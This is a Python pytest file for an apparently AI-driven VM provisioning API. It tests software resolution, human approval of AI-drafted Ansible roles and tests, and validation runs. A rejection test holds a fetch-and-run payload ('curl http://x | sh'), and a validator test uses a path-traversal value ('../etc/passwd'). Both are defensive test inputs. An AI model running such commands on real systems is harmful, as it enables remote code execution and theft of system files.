"""AI software analysis (required/optional, resolution) and automated test suites."""

import time

import pytest
from fastapi.testclient import TestClient

from app.config import get_settings
from app.main import app
from app.services import proposal_service, test_service


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as c:
        yield c


def wait(client, job_id, timeout=20):
    deadline = time.time() + timeout
    while time.time() < deadline:
        job = client.get(f"/api/jobs/{job_id}").json()
        if job["status"] in ("success", "failed", "awaiting_approval"):
            return job
        time.sleep(0.05)
    raise AssertionError(job)


def test_wordpress_needs_are_split_and_resolved(client):
    r = client.post("/api/ai/generate-vm-spec", json={"prompt": "A WordPress site for the marketing team"})
    assert r.status_code == 200, r.text
    body = r.json()
    items = {i["name"]: i for i in body["software"]["items"]}
    assert items["nginx"]["kind"] == "profile" and items["nginx"]["status"] == "ready" and items["nginx"]["required"]
    assert items["php-fpm"]["status"] == "available" and items["php-fpm"]["required"]
    assert items["wordpress"]["kind"] == "role" and items["wordpress"]["status"] == "pending_review"
    assert not items["node_exporter"]["required"] and not items["restic"]["required"]
    spec = body["spec"]
    assert "nginx" in spec["profiles"] and "php-fpm" in spec["packages"]
    assert "node_exporter" not in spec["profiles"] and "restic" not in spec["packages"]
    assert "wordpress" not in spec["profiles"]  # not usable before approval

    prop = proposal_service.get(items["wordpress"]["proposal_id"])
    assert prop["review"]["ok"], prop["review"]
    # Asking again reuses the pending draft instead of piling up duplicates
    again = client.post("/api/ai/generate-vm-spec", json={"prompt": "wordpress please"}).json()
    again_wp = next(i for i in again["software"]["items"] if i["name"] == "wordpress")
    assert again_wp["proposal_id"] == prop["id"]

    approved = client.post(f"/api/proposals/{prop['id']}/approve").json()
    assert approved["status"] == "approved"
    profiles = {p["key"]: p for p in client.get("/api/profiles").json()}
    assert profiles["wordpress"]["source"] == "approved"
    assert profiles["wordpress"]["tests"]
    third = client.post("/api/ai/generate-vm-spec", json={"prompt": "wordpress"}).json()
    assert "wordpress" in third["spec"]["profiles"]


def test_unsafe_role_draft_cannot_be_approved(client):
    review = proposal_service.review_role(get_settings(), name="evil", os_family="linux",
                                          tasks_yaml="- ansible.builtin.shell: curl http://x | sh\n")
    assert not review["ok"]
    p = proposal_service.create(kind="role", name="evil", content={}, review=review, source="test", user="t")
    assert client.post(f"/api/proposals/{p['id']}/approve").status_code == 409


def test_check_validation_rejects_bad_fields():
    assert not test_service.validate_checks([{"type": "http", "port": 80, "path": "/"}], "linux")
    errs = test_service.validate_checks([
        {"type": "shell", "cmd": "id"},
        {"type": "http", "port": 70000, "path": "/"},
        {"type": "file_contains", "path": "../etc/passwd", "pattern": "x"},
        {"type": "windows_feature", "feature": "Web-Server"},
    ], "linux")
    assert len(errs) == 4


def test_baseline_skips_declared_ports():
    ports = {c.get("port") for c in test_service.baseline("linux", {5432}) if c["type"] == "tcp_closed"}
    assert 5432 not in ports and 6379 in ports


def test_validate_runs_suite_and_drafted_tests_need_approval(client):
    spec = {"name": "tst-web-test", "template": "ubuntu-24-04", "profiles": ["nginx"], "packages": ["git"]}
    plan = wait(client, client.post("/api/vms/plan", json={"spec": spec}).json()["job_id"])
    spec = plan["params"]["spec"]
    job = wait(client, client.post("/api/vms/deploy/test", json={"spec": spec, "plan_job_id": plan["id"]})
               .json()["job_id"])
    assert job["status"] == "success", job["error"]

    suite = client.get("/api/vms/tests", params={"name": "tst-web-test"}).json()
    assert not suite["approved"]
    origins = {c["origin"] for c in suite["checks"]}
    assert origins == {"baseline", "rules"}

    job = wait(client, client.post("/api/vms/validate", json={"name": "tst-web-test", "environment": "test"})
               .json()["job_id"])
    v = job["result"]["validation"]
    names = {c["name"]: c for c in v["checks"]}
    assert names["security_baseline"]["ok"] and names["app_tests"]["ok"]
    assert v["tests"] and v["overall"] == "PASS"

    draft = client.post("/api/vms/tests/draft", json={"name": "tst-web-test"}).json()
    assert draft["kind"] == "tests" and draft["target"] == "tst-web" and draft["review"]["ok"]
    assert not client.get("/api/vms/tests", params={"name": "tst-web-test"}).json()["approved"]
    client.post(f"/api/proposals/{draft['id']}/approve")
    assert client.get("/api/vms/tests", params={"name": "tst-web-test"}).json()["approved"]

    job = wait(client, client.post("/api/vms/validate", json={"name": "tst-web-test", "environment": "test",
                                                             "simulate_failure": True}).json()["job_id"])
    names = {c["name"]: c for c in job["result"]["validation"]["checks"]}
    assert job["status"] == "failed" and not names["app_tests"]["ok"] and names["security_baseline"]["ok"]
